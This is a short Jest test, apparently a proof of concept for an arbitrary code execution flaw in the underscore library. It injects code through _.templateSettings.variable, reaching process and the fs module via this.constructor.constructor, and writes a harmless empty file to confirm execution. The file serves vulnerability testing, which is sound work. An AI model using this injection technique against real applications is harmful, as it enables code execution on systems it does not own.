test("Arbitrary code execution in underscore", () => {
  expect.assertions(2);
  const fs = require("fs");
  const _ = require("underscore");
  const path = "./underscore";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  _.templateSettings.variable =
    "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)";
  const t = _.template("")();
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
